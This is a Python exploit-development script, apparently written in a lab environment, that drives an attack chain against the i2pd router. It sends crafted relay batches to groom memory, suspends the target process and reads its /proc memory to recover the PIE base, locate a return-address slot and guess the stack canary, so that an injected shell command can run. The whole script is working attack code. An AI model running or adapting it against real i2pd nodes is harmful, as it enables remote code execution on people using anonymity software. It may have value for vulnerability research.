
import sys, struct, time, signal, os
sys.path.insert(0, "/home/agentuser/i2pd-lab/vuln01")
import atk_p6_terminal as A
from atk_p6_terminal import Chain
A.LIBC_EXIT = A.get_libc_exit()
ch = Chain("echo MARK > /tmp/m1", 96)
ch.setup()
tag = ch.sc.relay_tag
ch.fire_batch(4, 0x9000, tag, ln=A.RELAY_SMALL)
ch.drain(ch.sc, want_nonces=list(range(0x9000,0x9004)), timeout=2.0)
ch.fire_batch(1, 0x9100, tag, ln=A.RELAY_BIG)
time.sleep(0.05)
os.kill(ch.bob_pid, signal.SIGSTOP); time.sleep(0.05)
maps = open("/proc/%d/maps" % ch.bob_pid).read()
pie=None
for line in maps.splitlines():
    if line.rstrip().endswith("/i2pd") and "r-xp" in line:
        parts=line.split(); pie=int(parts[0].split("-")[0],16)-int(parts[2],16); break
needle = struct.pack("<Q", pie+0x42f4e7)
# find active frame segment
with open("/proc/%d/mem" % ch.bob_pid, "rb", 0) as mem:
    seg=None; slot=None
    for line in maps.splitlines():
        parts=line.split(None,5)
        a,b=parts[0].split("-"); a,b=int(a,16),int(b,16)
        nm=parts[5].strip() if len(parts)>5 else ""
        if "rw" not in parts[1] or "[vvar" in nm or "[vsys" in nm: continue
        try: mem.seek(a); data=mem.read(b-a)
        except Exception: continue
        i=data.find(needle)
        if i>=0: seg=(a,b,data); slot=a+i; break
    print("seg", [hex(x) for x in seg[:2]], "slot", hex(slot))
    a,b,data=seg
    # read real canary from TLS: fs base guess = seg end - 0x900 (glibc TLS above stack top)
    # instead: scan stack region [slot-2048, slot+2048] for candidate canary with >=2 occurrences in whole stack
    lo=max(slot-2048,seg[0]); hi=min(slot+2048,seg[1])
    cnt={}
    for o in range(lo,hi-8,8):
        v=struct.unpack("<Q",data[o-seg[0]:o-seg[0]+8])[0]
        if (v&0xff)==0 and v>>32!=0 and not (pie<=v<pie+0x600000) and not (0x7f0000000000<=v<0x800000000000 and v>seg[0] and v<seg[1]) :
            cnt.setdefault(v,[]).append(o)
    whole = data
    for v,offs in sorted(cnt.items(), key=lambda x:-len(x[1]))[:8]:
        n=whole.count(struct.pack("<Q",v))
        print("cand %#x occurrences in seg: %d slots:%s" % (v,n,[hex(x) for x in offs[:4]]))
os.kill(ch.bob_pid, signal.SIGCONT)
